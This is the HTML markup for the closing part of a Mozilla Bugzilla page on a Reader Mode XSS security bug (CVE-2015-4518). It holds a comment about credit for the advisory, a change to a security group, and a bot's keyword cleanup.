      </tr>
      <tr id="ar-a9439680_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a9439680_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-10-28 12:55 PDT" data-time="1446062154">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2015-4518</div></div></div><div class="change-set" id="c65"><div class="comment" data-id="10888605" data-no="65"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-65" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a9439680_280903"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a9439680_280903"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-65"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-65" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c65">Comment 65</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-10-30 02:32 PDT" data-time="1446197541">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-65">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-65" data-comment-id="10888605">When writing an advisory, please note that this was identified by Mario (this bug) and me (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - Reader Mode does not completely disable all active content (XSS)"
   href="/show_bug.cgi?id=1136692">bug 1136692</a>) in parallel.</pre></div><div class="change-set" id="a30861063_1689"><div class="change" id="aa30861063_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a30861063_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a30861063_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a30861063_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a30861063_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a30861063_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2016-07-02 11:18 PDT" data-time="1467483537">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div class="change-set" id="c66"><div class="comment" data-id="13076477" data-no="66"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-66" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_601546" id="a30861063_1689"><img src="https://secure.gravatar.com/avatar/9635e82c8208ca83b5a0d0157e063640?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_601546" id="a30861063_1689"><a class="email " href="/user_profile?user_id=601546" > <span class="fna">Firefox Bug Husbandry Bot</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-66"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-66" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c66">Comment 66</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-02-28 10:32 PST" data-time="1519842754">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-66">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-66" data-comment-id="13076477">Removing leave-open keyword from resolved bugs, per :sylvestre.</pre><div class="activity"><div class="change">Keywords: <span class="activity-deleted"><a href="/buglist.cgi?keywords=leave-open&amp;resolution=---">leave-open</a></span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1182778&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>